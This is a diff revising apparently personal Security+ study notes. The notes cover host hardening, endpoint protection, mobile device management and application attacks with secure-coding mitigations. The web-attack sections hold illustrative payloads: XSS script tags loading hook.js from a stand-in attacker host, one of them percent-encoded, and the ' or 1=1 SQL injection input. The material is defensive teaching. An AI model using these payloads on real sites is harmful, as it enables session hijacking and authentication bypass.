@@ -1,470 +1,524 @@
 ---
 layout: post
-title: "Host Security, Mobile Device Management & Secure Application Concepts (Modules 12–14)"
+title: "L1 Week 4: Host Security, Mobile Solutions, and Secure Application Concepts"
 date: 2026-05-09 00:00:00 +0200
 categories: [Infosec Field Notes, Security+ SY0-601]
-tags: [hardening, patch-management, endpoint-protection, epp, dlp, hids, hips, mdm, emm, byod, cope, mobile-security, jailbreaking, rooting, application-attacks, buffer-overflow, dll-injection, xss, sql-injection, session-hijacking, replay-attacks, secure-coding, web-security]
-description: "Covers host hardening and endpoint protection, mobile device deployment and management models, and web/application attack indicators with secure coding mitigations — all exam-relevant for SY0-601."
+tags: ["security+", "sy0-601", "hardening", "patch-management", "endpoint-protection", "epp", "dlp", "hids", "hips", "antivirus", "mdm", "emm", "byod", "cope", "cobo", "mobile-security", "remote-wipe", "encryption", "jailbreaking", "rooting", "application-attacks", "buffer-overflow", "dll-injection", "xss", "sql-injection", "session-hijacking", "replay-attack", "secure-coding", "input-validation", "cookies"]
+description: Covering host hardening and endpoint protection (Module 12), mobile device management and deployment models (Module 13), and application attack indicators with secure coding practices (Module 14).
 last_modified_at: 2026-05-11 00:00:00 +0200
 image:
   path:
 ---
 
-> **Playlist:**
+> **Playlist:** [Security+ Video Series](https://www.youtube.com/watch?v=dyKg_bQOXfU&list=PLky4bd7_03m8o1NB0j96OsxZs0KcKlgMO&index=1)
 
 ---
 
-## 1. Host Hardening
+## 1. Hardening
 
-**Hardening** is the process of configuring an OS or application into a secure state. It reduces the attack surface by restricting unnecessary access, disabling unused services, and enforcing least-privilege settings. Every hardening decision is a trade-off between security posture and operational usability.
+**Hardening** is the process of configuring an OS or application into a secure state. Every feature or service left enabled is a potential attack surface — hardening systematically reduces that surface to the minimum required for the system's intended function.
 
-> **Exam tip:** Hardening is always contextual — the same configuration that secures a web server may break a development workstation. Questions will test whether you understand that balance.
+The key constraint: hardening must be balanced against usability. Locking down a workstation to server-level security may break legitimate workflows. The intended role of the system always drives the hardening baseline.
 
 ---
 
 ## 2. Patch Management
 
-No software is vulnerability-free. The window between vulnerability disclosure and patch deployment is the highest-risk period: vendors are racing to release a fix while attackers are racing to weaponize it. Automated vulnerability scanners identify missing patches, but scanning alone is useless without a process to apply them.
+No software is free of vulnerabilities. The moment a CVE is published, two races start simultaneously: the vendor racing to patch it, and the attacker racing to exploit it. Patch management is the discipline that ensures the vendor wins.
 
-### 2.1 Deployment Models
+**Small/residential networks:** hosts are configured for auto-update. This is simple but creates problems at scale — multiple update agents (OS, browser, Java, OEM drivers, AV) running concurrently on the same host cause performance issues and management overhead.
 
-| Environment | Approach | Notes |
-|---|---|---|
-| Residential / small networks | Auto-update enabled | OS, browser, Java, OEM drivers all run update clients — can conflict |
-| Enterprise | Centralized patch management suite | e.g., **SCCM** (Microsoft System Center Configuration Manager) |
+**Enterprise networks:** use a centralized patch management suite such as **Microsoft SCCM (System Center Configuration Manager)** to:
+- Inventory missing patches across the environment using automated vulnerability scanners
+- Test patches before deployment
+- Push patches on a controlled schedule
+- Report compliance status
 
-> **Exam tip:** SCCM is the canonical enterprise patch management example. Know it by name. Multiple competing update clients on one host cause performance issues and false-positive security incidents — that's the problem EPP (section 3.3) partially solves.
+> Scanning for missing patches is useless without the operational procedures to actually apply them. Detection without remediation is just a list of known weaknesses.
 
 ---
 
 ## 3. Endpoint Protection
 
-### 3.1 Antivirus / Anti-Malware (A-V)
+### 3.1 Antivirus / Anti-Malware
 
-First-generation A-V uses **signature-based detection** — matching known malware hashes/patterns. Modern A-V has expanded to cover the full malware taxonomy: viruses, worms, Trojans, spyware, PUPs, and cryptojackers. Signature-based detection alone is insufficient for breach prevention because zero-days and polymorphic malware evade it by definition.
+**Antivirus (A-V)** originated as signature-based detection of known viruses. Modern A-V products have expanded scope — they detect viruses, worms, Trojans, spyware, PUPs (potentially unwanted programs), and cryptojackers. The term "anti-malware" is more accurate for current products.
 
-### 3.2 Host-Based IDS/IPS (HIDS/HIPS)
+**Critical limitation:** signature-based detection cannot catch what it has no signature for. Zero-days, novel malware variants, and fileless attacks bypass A-V entirely. Signature-based detection alone is insufficient to prevent data breaches — it must be layered with behavioral controls.
 
-**HIDS** provides threat detection through log and file-system monitoring. **HIPS** adds prevention capability on top of detection.
+### 3.2 Host-Based IDS / IPS (HIDS / HIPS)
 
-| Capability | Description |
-|---|---|
-| File system integrity monitoring | Detects changes to OS system files, drivers, executables using signatures |
-| Port/interface monitoring | Watches for unexpected network listeners |
-| Log analysis | Processes application logs (e.g., HTTP, FTP) for anomalies |
+**HIDS** detects threats via log monitoring and file system integrity monitoring. It checks whether managed file images — OS system files, drivers, application executables — have changed from a known-good baseline using cryptographic signatures.
+
+HIDS products may also monitor:
+- Active ports and network interfaces
+- Process execution data
+- Logs from specific applications (HTTP, FTP, etc.)
+
+**HIPS** is the preventive variant — it takes automated action (block, terminate) rather than just alerting.
 
 ### 3.3 Endpoint Protection Platform (EPP)
 
-An **EPP** consolidates multiple security functions into a single agent, eliminating the conflicts and resource overhead of running separate A-V, HIDS, and host firewall agents.
+Running separate agents for A-V, HIDS, host firewall, and web filtering creates compounding problems: performance degradation, agent conflicts, false positives, and increased support burden.
 
-| EPP Component | Function |
+An **EPP** consolidates all endpoint security functions into a single agent:
+
+| EPP Function | Description |
 |---|---|
-| Malware / intrusion detection & prevention | Replaces standalone A-V + HIPS |
-| Host firewall | Replaces standalone host-based firewall |
-| Web content filtering / secure browsing | Controls outbound web access |
-| File / message encryption | Protects data at rest and in transit |
-
-> **Exam tip:** Multiple agents = performance hits + conflicts + false positives. EPP = single agent. This is a common scenario question setup.
+| Malware detection/prevention | A-V + behavioral analysis |
+| Intrusion detection/prevention | HIDS/HIPS |
+| Host firewall | Local traffic filtering |
+| Web content filtering | Secure search and browsing enforcement |
+| File/message encryption | Data-at-rest and in-transit protection |
+| DLP | Data loss prevention (see below) |
 
 ### 3.4 Data Loss Prevention (DLP)
 
-Many EPPs include a **DLP** agent. DLP is configured with policies that identify sensitive data patterns (e.g., credit card numbers, PII). The agent enforces those policies to block unauthorized copying, emailing, or exfiltration of matched data.
+A **DLP agent** (commonly bundled in EPPs) is configured with policies that define what data is sensitive — credit card numbers, PII, classified document patterns, etc. The agent enforces these policies by:
+- Preventing sensitive data from being copied to removable media
+- Blocking unauthorized email attachments containing sensitive content
+- Alerting on or blocking uploads of tagged files
+
+DLP operates on **content inspection**, not just file type or destination.
 
 ---
 
 ## 4. Mobile Device Deployment Models
 
-Mobile devices are primary access points for corporate data. The deployment model determines device ownership and the degree of corporate control vs. employee privacy.
+Mobile devices are now primary endpoints for email, calendaring, and cloud application access. How an organization provisions and owns those devices directly determines the attack surface and the organization's ability to enforce security controls.
 
-| Model | Owner | Use | Corporate Control |
+| Model | Ownership | Typical Use | Security Control Level |
 |---|---|---|---|
-| **BYOD** (Bring Your Own Device) | Employee | Personal + corporate | Limited; highest friction |
-| **COBO** (Corporate Owned, Business Only) | Company | Corporate only | Full |
-| **COPE** (Corporate Owned, Personally Enabled) | Company | Corporate + personal | High; personal use permitted |
-| **CYOD** (Choose Your Own Device) | Company | Corporate + personal | High; employee picks from approved list |
+| **BYOD** (Bring Your Own Device) | Employee | Personal device used for work | Lowest — employee may resist MDM enrollment |
+| **COBO** (Corporate Owned, Business Only) | Company | Work use only; no personal apps | Highest — full control |
+| **COPE** (Corporate Owned, Personally-Enabled) | Company | Work device; personal use permitted under AUP | High — device is corporate property |
+| **CYOD** (Choose Your Own Device) | Company | Employee selects from an approved list | High — same as COPE, wider device choice |
 
-> **Exam tip:** BYOD is most popular with employees but hardest to secure. COBO gives maximum control. COPE/CYOD are the middle-ground enterprise options. Expect scenario questions asking which model fits a given security requirement.
+> **Exam tip:** BYOD is the most popular model with employees and the hardest to secure. COBO gives the tightest control but lowest employee satisfaction. Know the tradeoff for each.
 
 ---
 
 ## 5. Enterprise Mobility Management (EMM)
 
-**EMM** is the software class that applies security policies to mobile devices and applications in enterprise environments. It has two core functions:
+**EMM** is the management framework that applies security policy to mobile devices and applications at scale. It has two main functional pillars:
 
-| Function | Scope | Key Capabilities |
-|---|---|---|
-| **MDM** (Mobile Device Management) | Device-level | Authentication policies, feature restrictions (camera, mic), connectivity, remote wipe |
-| **MAM** (Mobile Application Management) | App-level | Controls which apps handle corporate data, prevents data transfer to personal apps, manages containerized workspaces |
+| Component | Full Name | Scope | Key Capabilities |
+|---|---|---|---|
+| **MDM** | Mobile Device Management | The device itself | Authentication policy, feature restrictions (camera, mic), connectivity enforcement, remote wipe, device reset |
+| **MAM** | Mobile Application Management | Applications and data | App allowlist/blocklist, prevent data transfer between corporate and personal apps, enterprise container/workspace isolation |
+
+MDM handles the hardware layer; MAM handles the data layer. Together they implement the enforcement boundary between corporate and personal data on the same device.
 
 ---
 
 ## 6. Mobile Access Control
 
-### 6.1 Authentication
+If a threat actor gains physical access to a smartphone, they inherit access to email, credentials stored in apps, authenticator tokens, and potentially VPN sessions.
 
-Smartphones are single-user devices. Access control is enforced via:
+**Screen lock authentication options:**
+- Password / PIN
+- Swipe pattern
+- Biometrics: fingerprint (most common), facial recognition, voice recognition
 
-- Screen lock: password, PIN, swipe pattern, or biometric (fingerprint, facial, voice)
-- **Lockout policy**: escalating lockout on repeated wrong attempts (e.g., 1st fail → 30 sec lock; 3rd fail → 10 min lock)
-
-### 6.2 Remote Wipe / Kill Switch
-
-A **remote wipe** restores the device to factory defaults or sanitizes personal data. Triggers include: N incorrect passcode attempts, or an MDM command.
-
-| Feature | Description |
-|---|---|
-| Data sanitization | Wipes user data; some utilities also wipe plug-in SD cards |
-| Pre-wipe backup | Can back up data to server before wiping |
-| Lost device message | Displays contact info on handset |
-
-> **Exam tip:** A determined attacker can defeat remote wipe by keeping the device offline (no network = no wipe command). Air-gap resistance is a known limitation of this control.
-
-### 6.3 Full Device Encryption
-
-All modern mobile OSes support full device encryption. iOS implements it in two layers:
-
-```
-Layer 1 — Always-on encryption:
-  All user data encrypted with a key stored ON the device.
-  Primary use: fast wipe (delete key → data inaccessible without overwriting storage)
-
-Layer 2 — Data Protection:
-  Email + Data Protection-enabled apps encrypted with a key derived from
-  the user's credential.
-  Protects data if device is stolen.
-  NOT all data uses this layer — contacts, SMS, photos are excluded.
-```
-
-### 6.4 Location Services
-
-**Geolocation** uses network attributes to determine device position.
-
-| System | Mechanism |
-|---|---|
-| **GPS** | Latitude/longitude via satellite signals through a GPS sensor |
-| **IPS** (Indoor Positioning System) | Triangulates proximity to cell towers, Wi-Fi APs, Bluetooth/RFID beacons |
-
-Any app granted permission by the user can access location services.
+**Lockout policy:** escalating lockout after repeated failed attempts deters brute-force. Example: 1st failure → 30 seconds; 3rd failure → 10 minutes; N failures → device wipe.
 
 ---
 
-## 7. Rooting and Jailbreaking
+## 7. Remote Wipe
 
-Standard mobile OSes run the device owner as an unprivileged user. Privilege escalation techniques allow users to bypass carrier, OEM, and OS restrictions.
+A **remote wipe (kill switch)** allows an administrator or the device owner to trigger a factory reset or data sanitization remotely — over the air — if the device is stolen or lost.
 
-| Technique | Platform | Method | Notes |
+**Trigger sources:**
+- N consecutive incorrect passcode attempts
+- MDM/EMM administrator action
+- Owner-initiated via device management portal
+
+**Additional capabilities** some platforms support:
+- Back up device data to a server before wiping
+- Display a "Lost/stolen — return to [contact]" message on the lock screen
+- Wipe removable/plug-in memory cards
+
+**Limitation:** a sophisticated attacker can prevent a remote wipe by isolating the device from all networks before hacking it. Remote wipe is a control, not a guarantee — encryption provides the underlying protection when wipe is not possible.
+
+---
+
+## 8. Full Device Encryption
+
+Modern mobile OSes encrypt storage by default. iOS implements encryption in layers:
+
+| Layer | Key Source | What It Protects | Primary Purpose |
 |---|---|---|---|
-| **Rooting** | Android | Authorized mechanism, exploited vulnerability, or custom firmware/ROM | Custom ROM = new Android OS image flashed to device |
-| **Jailbreaking** | iOS | Boots device with a patched kernel, usually via tethered exploit (device connected to computer at boot) | Enables sideloading, carrier changes, interface customization |
-| **Carrier unlocking** | Both | Removes single-carrier restriction | Legal in many jurisdictions |
+| **Base encryption** | Key stored on device | All user data | Fast wipe — delete the key, data becomes inaccessible without overwriting every block |
+| **Data Protection** | Key derived from user credential | Email, apps opted in to Data Protection | Protects data if device is stolen and passcode is unknown |
 
-> **Exam tip:** Rooting = Android. Jailbreaking = iOS. Both remove security controls and create unmanaged endpoints — a serious MDM problem in BYOD environments.
-
----
-
-## 8. Application Attack Indicators
-
-Application attacks target design flaws in OS or application software to execute arbitrary code, escalate privileges, or cause denial of service. Detection relies on host monitoring, logging, and behavioral analysis since many attacks won't trigger automated alerts.
-
-### 8.1 Privilege Escalation
-
-**Arbitrary code execution** — running attacker-supplied code within a process's context. **Remote code execution (RCE)** — arbitrary code transmitted and executed across a network. Both typically aim to install a backdoor or cause DoS. The simplest indicator of an application attack is unexpected privilege escalation visible in process or audit logs.
-
-### 8.2 Error Handling
-
-Poor error handling leaks implementation details. A Windows unhandled exception may show: "Instruction could not be read or written," "Undefined exception," or "Process has encountered a problem." A web app unhandled exception may reveal database type and configuration — directly useful for follow-on attacks.
-
-> **Exam tip:** Error messages that expose platform/config details are a misconfiguration vulnerability, not just poor UX. Expect questions on what information should *not* be in error responses.
-
-### 8.3 Improper Input Handling
-
-The root cause of most application attacks. Input that isn't validated allows two main attack families:
-
-| Attack Family | Mechanism |
-|---|---|
-| Overflow attacks | Input larger than the allocated variable/buffer |
-| Injection attacks | Malicious code/commands embedded in input passed to an interpreter |
+**Note:** not all iOS data uses Data Protection. Contacts, SMS messages, and photos are excluded by default.
 
 ---
 
-## 9. Overflow Vulnerabilities
+## 9. Location Services
 
-In an **overflow attack** the attacker submits input that exceeds the size of the variable the application allocated for it.
+**Geolocation** identifies a device's physical position using one or both of:
 
-### 9.1 Buffer Overflow / Stack Overflow
+| System | Mechanism | Use Case |
+|---|---|---|
+| **GPS** | Satellite signals via GPS sensor | Outdoor positioning; high accuracy |
+| **IPS** (Indoor Positioning System) | Triangulation from cell towers, Wi-Fi APs, Bluetooth/RFID beacons | Indoor positioning where GPS signal is weak |
 
-A **buffer** is a reserved memory area. A **stack** is the memory region used by a subroutine, containing a return address pointing back to the calling function. Overflowing the stack lets an attacker overwrite the return address with a pointer to attacker-controlled code.
+Location services is available to any app the user has granted permission to — which itself is an attack surface. Malicious apps can silently track location if permissions are not carefully reviewed.
+
+---
+
+## 10. Rooting and Jailbreaking
+
+Mobile OSes, like desktop OSes, run the owner's session under a restricted account — not the root/kernel account. Vendors, OEMs, and carriers use this to enforce restrictions on what software can be installed and how the device can be configured. Users who want to bypass these restrictions must escalate privileges.
+
+| Technique | Platform | Method | What It Enables |
+|---|---|---|---|
+| **Rooting** | Android | Exploit vulnerability or flash custom firmware (custom ROM) | Root account access; install unauthorized apps (sideloading); modify system files |
+| **Jailbreaking** | iOS | Boot with a patched kernel (typically tethered — requires PC connection on boot) | Root access; sideload apps; change carriers; UI customization |
+| **Carrier unlocking** | iOS / Android | Remove carrier restrictions | Use device on any carrier |
+
+**Security implications of rooting/jailbreaking:**
+- Bypasses OS security model — malware can run with root privileges
+- Removes vendor security patches from the standard update path (custom ROMs may lag)
+- MDM enrollment and corporate app policies may be circumvented
+- Remote wipe may be disabled
+
+> **Exam tip:** jailbreaking is an iOS term; rooting is Android. Both achieve the same outcome — privilege escalation on the device — but the mechanisms differ. Tethered jailbreak = requires a connected PC to boot the patched kernel.
+
+---
+
+## 11. Application Attack Indicators
+
+Application attacks target vulnerabilities in OS or application software to achieve **arbitrary code execution** — running attacker-controlled code within the context of a trusted process. The goal is typically a foothold or lateral movement.
+
+**Arbitrary code execution:** attacker runs their own code on the system.
+**Remote code execution (RCE):** the malicious code is delivered from a remote machine.
+
+The simplest observable indicator of an application attack is **privilege escalation** — a process suddenly operating at a higher privilege level than it was designed to use.
+
+### 11.1 Error Handling
+
+A crash or unhandled exception is often a signal that an attack was attempted (even if unsuccessful). Dangerous behavior: unhandled exceptions on web apps that expose platform details in the error page — database type, version, stack trace — giving attackers reconnaissance data for the next attempt.
+
+Windows error indicators: "Instruction could not be read or written," "Undefined exception," "Process has encountered a problem."
+
+### 11.2 Improper Input Handling
+
+Most application attacks work by passing maliciously constructed input to a vulnerable process. Input validation failure is the root cause of two major attack families: **overflow attacks** and **injection attacks**.
+
+---
+
+## 12. Overflow Vulnerabilities
+
+### 12.1 Buffer Overflow
+
+A **buffer** is a reserved memory area for expected data. In a buffer overflow, the attacker submits input larger than the buffer can hold, overwriting adjacent memory.
+
+**Stack overflow** — the most common variant:
 
 ```
 Normal Execution:
   Main() Stack
   Main()
-  Return Address  ──→  points back to Main()
+  Return Address  ──► back to Main()
   Sub() Stack
   Sub()
 
-Exploit Execution (Stack Overflow):
+Exploit Execution:
   Main() Stack
   Main()
-  Return Address  ──→  redirected to Shellcode
-  NOP             ← NOP sled (pads to shellcode)
+  Return Address  ──► redirected to shellcode
+  NOP             ← NOP sled (attacker-controlled)
   NOP
-  Shellcode       ← attacker code executes here
+  Shellcode       ← attacker's payload
   NOP
   Sub()
 ```
 
-> **Exam tip:** NOP sleds increase the attacker's chance of hitting the shellcode when the exact address is uncertain. Know the flow: overflow → overwrite return address → redirect execution to shellcode.
+The attacker overfills the Sub() stack buffer, overwrites the return address with a pointer into the NOP sled, and when Sub() returns, execution flows into the shellcode instead of back to Main().
+
+**Detection indicators:** unexplained crashes or error messages after a file download, execution of a new app/script, or connection of new hardware.
+
+### 12.2 Memory Leaks and Resource Exhaustion
+
+When a process no longer needs memory, it should release it. A **memory leak** occurs when it does not — memory is consumed indefinitely and never returned to the OS.
+
+**Impact:** reduced available memory for other processes; eventual system instability or crash.
+
+**Highest severity:** memory leaks in background services (run indefinitely) and OS kernel (no containment).
+
+A memory leak may itself be an indicator of a malicious or corrupted process consuming resources intentionally (resource exhaustion as a DoS vector).
 
 ---
 
-## 10. Memory Leaks and Resource Exhaustion
+## 13. DLL Injection
 
-A **memory leak** occurs when a process fails to release memory it no longer needs, progressively consuming available RAM. Critical in:
+A **DLL (Dynamic Link Library)** is a shared binary package implementing standard functionality — networking, cryptography, UI elements. Applications load multiple DLLs during normal operation.
 
-- Service/background applications (run indefinitely — leak accumulates)
-- OS kernel (crash = total system failure)
+**DLL injection** abuses OS inter-process attachment functionality to force a legitimate process to load a malicious DLL. The attacker's code then runs within the context of the trusted process, inheriting its privileges and evading detection.
 
-A memory leak can itself be an indicator of a malicious or corrupted process.
+**Why it's used:** migrating malicious code into legitimate processes makes it harder for security tools to attribute the behavior to malware. The malware appears to be normal activity from a trusted process.
 
----
-
-## 11. DLL Injection
-
-A **DLL (Dynamic Link Library)** is a binary package providing shared functionality (networking, crypto, etc.). Processes load multiple DLLs during normal operation.
-
-**DLL injection** abuses the OS mechanism that allows one process to attach to another. Malware forces a legitimate process to load a malicious DLL, inheriting its trust level and evading detection by hiding inside a trusted process.
-
-**Indicators:**
+**Indicators of DLL injection:**
 - Process opens unexpected network connections
-- Legitimate process interacts with files or registry keys it normally wouldn't touch
+- Legitimate process interacts with files or registry keys it has no reason to touch
+- Parent/child process relationships that don't match the application's normal behavior
 
 ---
 
-## 12. Web Application Attacks
+## 14. Web Application Attacks
 
-### 12.1 URL and HTTP Method Analysis
+### 14.1 URL and HTTP Analysis
 
-A URL can encode actions and data submitted to a server, making it a common attack vector.
+A URL encodes both location and action. Attackers weaponize URLs by embedding malicious data in query strings, using **percent encoding** to obfuscate the payload.
 
-| HTTP Method | Purpose | Security Relevance |
+```
+Legitimate:
+  http://trusted.foo/upload.php?post=hello
+
+Malicious (percent-encoded payload):
+  http://trusted.foo/upload.php?post=%3Cscript%3D%27http%3A%2F%2F...
+                                      └── decoded: <script src='http://badsite.foo/hook.js'>
+```
+
+**HTTP methods** — know these for the exam:
+
+| Method | Purpose | Attack Relevance |
 |---|---|---|
-| `GET` | Retrieve resource | Parameters exposed in URL; susceptible to parameter tampering |
-| `POST` | Send data for processing | Body-based injection; CSRF target |
-| `PUT` | Create or replace resource | Can enable unauthorized file upload if unprotected |
-| `DELETE` | Remove resource | Can destroy data if improperly authorized |
-| `HEAD` | Retrieve headers only | Used for reconnaissance (fingerprinting) |
+| **GET** | Retrieve a resource | Parameters exposed in URL; can be logged/cached |
+| **POST** | Send data for server processing | Form submissions; common injection vector |
+| **PUT** | Create or replace a resource | Can be abused to upload malicious files if not restricted |
+| **DELETE** | Remove a resource | Destructive if improperly authorized |
+| **HEAD** | Retrieve headers only (no body) | Reconnaissance — reveals server info without full response |
 
-HTTP response codes signal application behavior — `200 OK`, `404 Not Found`, `500 Internal Server Error` (the last often leaks stack traces).
+**HTTP response codes** — key ones: `200 OK`, `301/302 Redirect`, `403 Forbidden`, `404 Not Found`, `500 Internal Server Error`.
 
-### 12.2 Replay Attacks / Session Hijacking
+### 14.2 Replay Attacks and Session Hijacking
 
-Web sessions require a server-issued token. A **replay attack** captures or guesses that token to re-establish the session illegitimately.
+HTTP is stateless — servers maintain session state using **tokens** (most commonly cookies). A **replay attack** steals or guesses a valid token and re-submits it to hijack the session.
 
-**Cookies** are the primary session mechanism. Cookie types:
+**Cookie types:**
 
-| Type | Storage | Lifetime |
-|---|---|---|
-| Nonpersistent (session) | Browser memory | Deleted when browser closes |
-| Persistent | Browser cache | Until expiry date or manual deletion |
+| Type | Storage | Lifetime | Risk |
+|---|---|---|---|
+| **Non-persistent (session)** | Browser memory | Deleted when browser closes | Lower — no persistent storage |
+| **Persistent** | Browser disk cache | Until expiry or manual deletion | Higher — survives browser restarts |
 
-**Cookie security attributes:**
+**TLS limitation with cookies:** TLS encrypts cookies in transit, but they reside in plaintext on the client filesystem unless separately encrypted by the application.
 
-| Attribute | Effect |
-|---|---|
-| `Secure` | Cookie only sent over HTTPS — blocked on plain HTTP |
-| `HttpOnly` | Cookie inaccessible to JavaScript (DOM/client-side scripts) |
-| `SameSite` | Controls cross-site cookie sending — mitigates CSRF |
+**Session hijacking:** attacker sniffs session cookies from an unencrypted network (public Wi-Fi) and uses them to impersonate the authenticated user.
 
-**Session hijacking mitigations:**
-- Encrypt cookies in transit (TLS) and at rest (application-level encryption)
-- Delete session cookies on logout
-- Issue a new cookie on each reauthentication
+**Mitigations:**
+- Encrypt cookies in transit (HTTPS) and at rest (application-level encryption)
+- Issue a new cookie on every re-authentication
+- Delete cookies server-side when the user logs out
+- Set short cookie expiration times
 
-> **Exam tip:** TLS protects cookies *in transit* only — cookies still sit in plaintext in the browser cache unless separately encrypted. Know the distinction.
+### 14.3 Cross-Site Scripting (XSS)
 
-### 12.3 Cross-Site Scripting (XSS)
+**XSS** exploits the browser's trust in a site the user has legitimately visited. The attacker injects a malicious script into content served by the trusted site; the victim's browser executes it with the site's privileges.
 
-**XSS** exploits browser trust in scripts served from a visited domain. The attacker injects a malicious script that executes in the victim's browser under the trusted site's context.
-
-**Nonpersistent (reflected) XSS flow:**
+**Non-persistent XSS flow:**
 
 ```
-1. Attacker finds input validation flaw in trusted site
-2. Crafts malicious URL embedding script (e.g., in link or email)
-3. Victim clicks link → trusted site reflects injected script back in response
-4. Browser executes script under trusted site's origin
-5. Attacker steals cookies / intercepts form data / installs malware
+1. Attacker finds input validation flaw on trusted.foo
+2. Attacker crafts a malicious URL embedding a script:
+      http://trusted.foo/search?q=<script src="https://badsite.foo/hook.js"></script>
+3. Attacker delivers the URL to the victim (phishing email, malicious link)
+4. Victim clicks → trusted.foo reflects the script in the response
+5. Browser executes the script in the context of trusted.foo
 ```
 
-**Persistent (stored) XSS:** Attacker submits malicious script to a stored location (bulletin board post, comment field). Every subsequent viewer executes the script.
+**Persistent (stored) XSS:** attacker submits malicious script as content (e.g., a forum post). Every user who loads the page executes the script. No crafted URL required — the payload lives in the application's database.
 
-**Example payload:**
-```html
-Check out this amazing <a href="https://trusted.foo">website</a>
-<script src="https://badsite.foo/hook.js"></script>
-```
+**What XSS can do:** steal session cookies, capture form input (keylogging), deface pages, redirect to phishing sites, install malware via drive-by download.
 
-**Mitigation:** Input sanitization (encode/strip script tags on input and output), Content Security Policy (CSP) headers.
+### 14.4 SQL Injection (SQLi)
 
-### 12.4 SQL Injection
+Web applications query databases using SQL. If user input is passed directly into a SQL query without sanitization, an attacker can modify the query logic.
 
-Web apps use SQL to interact with databases via four core operations:
-
-| Statement | Action |
-|---|---|
-| `SELECT` | Read data |
-| `INSERT` | Add data |
-| `UPDATE` | Modify data |
-| `DELETE` | Remove data |
-
-In a **SQL injection attack**, the attacker appends or modifies SQL logic through an unsanitized input field, causing the database to execute unintended queries.
-
-**Classic example:**
-
+**Normal query:**
 ```sql
--- Intended query (user inputs "Bob"):
 SELECT * FROM tbl_user WHERE username = 'Bob'
-
--- Attacker inputs:  ' or 1=1
--- Resulting query:
-SELECT * FROM tbl_user WHERE username = '' or 1=1
--- 1=1 is always TRUE → returns all rows in the table
 ```
 
-**Impact:** Data exfiltration, unauthorized data modification, arbitrary code execution at database privilege level.
+**Injected input:** `' or 1=1`
 
-**Mitigation:** Parameterized queries / prepared statements, stored procedures, input validation, least-privilege database accounts.
+**Resulting malicious query:**
+```sql
+SELECT * FROM tbl_user WHERE username = '' or 1=1
+```
 
-> **Exam tip:** SQL injection is an **injection-type** attack rooted in improper input handling. The fix is always parameterization + input validation — *not* just escaping special characters.
+The condition `1=1` is always true — this returns every row in the table, bypassing authentication.
 
----
+**SQLi impact:** extract data (SELECT), insert records (INSERT), delete data (DELETE), update records (UPDATE), or execute arbitrary OS commands if the DB account has sufficient privileges.
 
-## 13. Secure Coding Practices
-
-### 13.1 Input Validation
-
-All input sources must be documented and validated. Input includes form fields, URL parameters, HTTP headers, and inter-process calls. Any input that doesn't conform to expected type, length, format, or range must be **rejected**, not sanitized-and-accepted.
-
-> **Exam tip:** Input validation is the primary mitigation for both overflow and injection attacks. Expect it to appear in mitigation questions for XSS, SQLi, and buffer overflows simultaneously.
-
-### 13.2 Secure Cookie Implementation
-
-| Practice | Rationale |
-|---|---|
-| Avoid persistent cookies for session auth | Persistent cookies survive browser close → stolen tokens remain valid |
-| Issue new cookie on reauthentication | Invalidates any captured session token |
-| Set `Secure` attribute | Blocks transmission over unencrypted HTTP |
-| Set `HttpOnly` attribute | Blocks JavaScript access — mitigates XSS cookie theft |
-| Set `SameSite` attribute | Restricts cross-origin cookie sending — mitigates CSRF |
+Reference: [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
 
 ---
 
-## 14. Quick Review / Exam Cheat Sheet
+## 15. Secure Coding Practices
+
+### 15.1 Input Validation
+
+Every input pathway into an application is a potential attack vector — form fields, URL parameters, HTTP headers, API calls, inter-process data. Input validation is the primary defense against both overflow and injection attacks.
+
+**Requirements:**
+- Document all input methods and reduce the attack surface where possible
+- Define what valid input looks like for each field (type, length, format, range)
+- Reject anything that does not conform — do not try to sanitize malformed input, reject it
+- Validate on the server side — client-side validation is trivially bypassed
+
+### 15.2 Secure Cookies
+
+| Cookie Attribute | What It Does | Why It Matters |
+|---|---|---|
+| **Secure** | Cookie only sent over HTTPS | Prevents transmission over unencrypted HTTP |
+| **HttpOnly** | Cookie inaccessible to JavaScript (DOM) | Blocks XSS from stealing the cookie via `document.cookie` |
+| **SameSite** | Restricts which origins can send the cookie | Mitigates Cross-Site Request Forgery (CSRF) |
+
+**Best practices:**
+- Never use persistent cookies for session authentication — use session cookies
+- Issue a fresh cookie on every re-authentication event
+- Encrypt cookie content if it contains sensitive data
+
+---
+
+## 16. Quick Review / Exam Cheat Sheet
+
+### Host Security Controls
+
+| Control | What It Does | Key Detail |
+|---|---|---|
+| Hardening | Reduce attack surface | Balanced against usability and intended role |
+| Patch management | Close known vulnerabilities | Scanning without remediation = known weakness list |
+| A-V / Anti-malware | Detect known malware | Signature-based; blind to zero-days |
+| HIDS | Detect intrusion via logs + file integrity | Monitors system files, ports, process logs |
+| HIPS | HIDS + automated blocking | Active prevention, not just alerting |
+| EPP | Single-agent platform consolidating all of the above | Avoids multi-agent conflicts and performance hit |
+| DLP | Prevent unauthorized data exfiltration | Policy-driven; inspects content, not just metadata |
 
 ### Mobile Deployment Models
 
 ```
-BYOD   → employee owns, least control, most employee-friendly
-COBO   → company owns, business use only, maximum control
-COPE   → company owns, personal use allowed, high control
-CYOD   → company owns, employee picks device from list, high control
+BYOD  → employee-owned → most popular, hardest to secure
+COBO  → company-owned, work only → tightest control
+COPE  → company-owned, personal use allowed → high control + flexibility
+CYOD  → employee picks from approved list → like COPE, wider choice
 ```
 
-### Endpoint Protection Components
+### EMM Components
 
-| Acronym | Full Name | Primary Function |
+```
+MDM = device-level policy (auth, features, remote wipe)
+MAM = app-level policy (corporate container, data transfer restrictions)
+EMM = MDM + MAM
+```
+
+### Mobile Security Controls
+
+| Control | Purpose |
+|---|---|
+| Screen lock + lockout policy | Deter passcode brute-force; escalating delays |
+| Remote wipe / kill switch | Sanitize stolen device over the air |
+| Full device encryption | Protect data if device is physically compromised |
+| Data Protection (iOS) | Credential-derived encryption for email and opted-in apps |
+| MDM enrollment | Enforce policy, enable remote management |
+
+### Rooting vs Jailbreaking
+
+```
+Rooting      → Android → exploit vuln or flash custom ROM → root access
+Jailbreaking → iOS     → boot patched kernel (tethered) → root + sideload
+Carrier unlock → either → remove carrier lock; not full root
+```
+
+### Application Attack Primitives
+
+```
+Arbitrary code execution  → attacker's code runs on target system
+Remote code execution     → payload delivered over the network
+Privilege escalation      → process runs at higher privilege than designed
+```
+
+### Overflow Attack Summary
+
+| Type | Mechanism | Target |
 |---|---|---|
-| A-V | Antivirus | Signature-based malware detection |
-| HIDS | Host-based Intrusion Detection System | Log + file-system monitoring |
-| HIPS | Host-based Intrusion Prevention System | HIDS + active blocking |
